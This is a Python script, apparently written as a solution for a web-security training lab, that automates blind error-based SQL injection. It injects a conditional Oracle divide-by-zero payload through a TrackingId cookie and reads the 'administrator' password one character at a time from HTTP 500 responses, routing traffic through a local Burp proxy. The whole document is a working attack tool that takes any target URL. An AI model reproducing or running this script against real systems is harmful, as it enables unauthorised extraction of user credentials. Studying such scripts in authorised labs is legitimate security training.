# Import necessary modules
import sys
import requests
import urllib3
import urllib.parse

# Disable warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to extract the password using SQL injection
def sqli_password(url):
    password_extracted = ""  # Variable to store the extracted password
    # Loop through each character of the password (assumed to be up to 20 characters)
    for i in range(1, 21):
        # Loop through ASCII characters (printable range) to guess each character of the password
        for j in range(32, 126):
            # Construct the SQL injection payload for extracting the password character
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i, j)
            # URL encode the SQL injection payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            # Set cookies for the request
            cookies = {'TrackingId': 'FGDUewi6MoAn18KJ' + sqli_payload_encoded, 'session': 'VdmCjrlz6I6zAXGXEp2u32p0OXKDGhm2'}
            # Send the GET request with cookies, ignoring SSL verification, and using proxies
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            
            # Check if the response status code indicates a successful SQL injection
            if r.status_code == 500:
                password_extracted += chr(j)  # Add the guessed character to the extracted password
                sys.stdout.write('\r' + password_extracted)  # Update and flush the output on the same line
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))  # Update and flush the output with the guessed character
                sys.stdout.flush()

# Main function to execute the SQL injection attack
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]  # Get the target URL from command-line argument
    print("(+) Retrieving administrator password...")
    sqli_password(url)  # Call the SQL injection password extraction function

# Entry point of the script
if __name__ == "__main__":
    main()  # Call the main function to start the attack
